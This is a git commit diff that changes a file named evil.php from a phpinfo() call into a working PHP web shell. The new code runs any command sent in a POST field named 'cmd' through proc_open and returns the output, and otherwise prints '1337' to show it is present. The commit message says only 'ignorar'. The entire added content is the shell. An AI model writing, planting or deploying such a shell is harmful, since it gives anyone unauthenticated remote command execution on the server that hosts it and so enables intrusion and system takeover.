ddc4e5a08b33710b40d275dd005f26eee1cbfaa9
bnakamura1 <118555064+bnakamura1@users.noreply.github.com>
2025-09-09 22:05:29 -0300

    Update evil.php
    ignorar

--- evil.php
+++ evil.php
@@ -1,3 +1,21 @@
-<?php 
-phpinfo();
+<?php
+if (isset($_POST["cmd"])) {
+  $cmd = ($_POST["cmd"]);
+  function exec_command($command)
+  {
+    $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("file", "error.txt", "a"));
+    $cwd = "";
+    $env = array('some_option' => 'leo');
+    $process = proc_open($command, $descriptorspec, $pipes, $cwd, $env);
+    if (is_resource($process)) {
+      echo stream_get_contents($pipes[1]);
+      fclose($pipes[1]);
+      proc_close($process);
+    }
+  }
+  exec_command($cmd);
+  exit;
+} else {
+  echo "1337";
+}
 ?>
